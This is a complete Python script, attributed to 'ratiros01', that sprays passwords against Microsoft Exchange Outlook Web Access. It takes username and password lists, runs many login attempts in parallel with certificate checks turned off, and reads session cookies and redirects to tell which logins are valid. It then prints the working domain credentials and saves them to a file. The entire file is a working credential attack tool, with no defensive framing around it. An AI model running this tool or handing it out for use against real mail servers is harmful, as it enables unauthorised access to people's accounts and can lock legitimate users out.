#!/usr/bin/env python3
"""
OWA Password Spray Tool
========================
Spray passwords against Microsoft Exchange OWA (Outlook Web Access).

Uses auth.owa with full session handling for accurate results.
Detection: checks for 'cadata' cookie and absence of 'reason=' in redirect.

Note: auth.owaauth.dll always returns HTTP 440 regardless of credential
validity. This tool uses auth.owa which requires a session (GET logon page
first, then POST credentials) to get accurate success/failure detection.

Usage:
    python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -p passwords.txt
    python3 owa_spray.py -t https://mail.target.com -d DOMAIN -u users.txt -p passwords.txt -T 10
    python3 owa_spray.py -t https://mail.target.com -d DOMAIN -U single_user -P single_pass

Author: ratiros01
"""

import argparse
import requests
import urllib3
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def try_login(target, domain, user, pw):
    """Attempt OWA login with full session handling."""
    try:
        s = requests.Session()
        s.verify = False

        # Get login page for session cookies
        s.get(f'{target}/owa/auth/logon.aspx', timeout=15)

        data = {
            'destination': f'{target}/owa/',
            'flags': '4',
            'forcedownlevel': '0',
            'username': f'{domain}\\{user}',
            'password': pw,
            'isUtf8': '1'
        }

        r = s.post(
            f'{target}/owa/auth.owa',
            data=data,
            allow_redirects=False,
            timeout=15
        )

        location = r.headers.get('Location', '')
        cookies = dict(s.cookies)
        success = 'reason=' not in location and 'cadata' in cookies

        return user, pw, success, r.status_code, location

    except requests.exceptions.Timeout:
        return user, pw, False, 0, 'TIMEOUT'
    except requests.exceptions.ConnectionError:
        return user, pw, False, 0, 'CONN_ERROR'
    except Exception as e:
        return user, pw, False, 0, str(e)


def main():
    parser = argparse.ArgumentParser(
        description='OWA Password Spray Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t https://mail.target.com -d CORP -u users.txt -p passwords.txt
  %(prog)s -t https://mail.target.com -d CORP -U admin -P 'Summer2025'
  %(prog)s -t https://mail.target.com -d CORP -u users.txt -p passwords.txt -T 10 -o hits.txt
  %(prog)s -t https://mail.target.com -d CORP -u users.txt -P 'Password1' --delay 2

Detection Method:
  Success = 302 redirect to /owa/ with 'cadata' cookie set
  Failure = 302 redirect to logon.aspx with 'reason=' parameter
  
Note:
  auth.owaauth.dll always returns HTTP 440 regardless of credential validity.
  This tool uses auth.owa with session handling for accurate detection.
        """
    )

    parser.add_argument('-t', '--target', required=True,
                        help='Target OWA URL (e.g. https://mail.target.com)')
    parser.add_argument('-d', '--domain', required=True,
                        help='Domain name (e.g. CORP or corp.local)')

    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument('-u', '--userfile', help='File containing usernames')
    user_group.add_argument('-U', '--user', help='Single username')

    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument('-p', '--passfile', help='File containing passwords')
    pass_group.add_argument('-P', '--password', help='Single password to spray')

    parser.add_argument('-T', '--threads', type=int, default=5,
                        help='Number of threads (default: 5)')
    parser.add_argument('-o', '--output', help='Output file for hits')
    parser.add_argument('--delay', type=float, default=0,
                        help='Delay between attempts in seconds (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Show all attempts, not just hits')

    args = parser.parse_args()

    # Strip trailing slash
    target = args.target.rstrip('/')

    # Load users
    if args.userfile:
        with open(args.userfile) as f:
            users = [l.strip() for l in f if l.strip()]
    else:
        users = [args.user]

    # Load passwords
    if args.passfile:
        with open(args.passfile) as f:
            passwords = [l.strip() for l in f if l.strip()]
    else:
        passwords = [args.password]

    combos = [(u, p) for u in users for p in passwords]
    total = len(combos)
    count = 0
    hits = 0
    errors = 0
    lock = Lock()
    start_time = time.time()
    found = []

    print(f"\n{'='*50}")
    print(f"  OWA Password Spray")
    print(f"{'='*50}")
    print(f"  Target  : {target}")
    print(f"  Domain  : {args.domain}")
    print(f"  Users   : {len(users)}")
    print(f"  Passwords: {len(passwords)}")
    print(f"  Combos  : {total}")
    print(f"  Threads : {args.threads}")
    print(f"{'='*50}\n")

    def process(user, pw):
        if args.delay > 0:
            time.sleep(args.delay)
        return try_login(target, args.domain, user, pw)

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(process, u, p): (u, p) for u, p in combos}

        for future in as_completed(futures):
            user, pw, success, code, location = future.result()

            with lock:
                count += 1
                elapsed = time.time() - start_time
                rate = count / elapsed if elapsed > 0 else 0

                if success:
                    hits += 1
                    found.append(f'{user}:{pw}')
                    print(f'\n  [+] VALID: {args.domain}\\{user}:{pw}')

                elif location in ('TIMEOUT', 'CONN_ERROR') or code == 0:
                    errors += 1
                    if args.verbose:
                        print(f'\n  [!] ERROR: {user}:{pw} ({location})')

                elif args.verbose:
                    print(f'\n  [-] FAIL:  {user}:{pw}')

                print(
                    f'\r  [{count}/{total}] '
                    f'{hits} hits, {errors} errors | '
                    f'{rate:.1f}/s | '
                    f'{user}:{pw}                    ',
                    end='', flush=True
                )

    elapsed = time.time() - start_time

    print(f"\n\n{'='*50}")
    print(f"  Results")
    print(f"{'='*50}")
    print(f"  Tested  : {count}")
    print(f"  Hits    : {hits}")
    print(f"  Errors  : {errors}")
    print(f"  Time    : {elapsed:.1f}s")
    print(f"  Rate    : {count/elapsed:.1f}/s")

    if found:
        print(f"\n  Valid Credentials:")
        for cred in found:
            print(f"    {args.domain}\\{cred}")

    print(f"{'='*50}\n")

    # Save hits
    if args.output and found:
        with open(args.output, 'w') as f:
            for cred in found:
                f.write(f'{cred}\n')
        print(f'  Hits saved to {args.output}\n')


if __name__ == '__main__':
    main()